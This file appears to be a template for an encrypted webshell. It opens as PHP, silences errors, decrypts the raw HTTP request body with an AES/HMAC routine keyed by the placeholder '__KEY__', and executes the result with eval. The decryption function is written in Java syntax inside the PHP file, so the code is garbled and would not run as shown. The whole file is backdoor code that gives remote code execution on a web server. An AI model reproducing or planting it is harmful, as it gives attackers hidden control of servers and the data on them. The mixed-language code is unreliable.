<?php
@error_reporting(0);
private byte[] Decrypt(byte[] data) throws Exception
{
    int prefixLen = 68;
    byte[] encrypted = new byte[data.length - prefixLen];
    System.arraycopy(data, prefixLen, encrypted, 0, encrypted.length);
    String key = "__KEY__";
    byte[] raw = key.getBytes("UTF-8");
    
    byte[] aesKey = new byte[16];
    for (int i = 0; i < 16; i++) {
        aesKey[i] = (byte) (raw[i % raw.length] ^ 0x1F);
    }
    
    javax.crypto.spec.SecretKeySpec sk = new javax.crypto.spec.SecretKeySpec(aesKey, "AES");
    
    byte[] iv = new byte[16];
    System.arraycopy(encrypted, 0, iv, 0, 16);
    
    byte[] tag = new byte[32];
    System.arraycopy(encrypted, encrypted.length - 32, tag, 0, 32);
    
    byte[] body = new byte[encrypted.length - 48];
    System.arraycopy(encrypted, 16, body, 0, body.length);
    
    javax.crypto.Mac mac = javax.crypto.Mac.getInstance("HmacSHA256");
    mac.init(sk);
    
    java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
    out.write(iv);
    out.write(body);
    byte[] check = mac.doFinal(out.toByteArray());
    
    if (!java.security.MessageDigest.isEqual(check, tag))
    {
        throw new Exception("bad mac");
    }
    
    javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES/CBC/PKCS5Padding");
    cipher.init(javax.crypto.Cipher.DECRYPT_MODE, sk, new javax.crypto.spec.IvParameterSpec(iv));
    return cipher.doFinal(body);
}
$post=Decrypt(file_get_contents("php://input"));
@eval($post);
?>
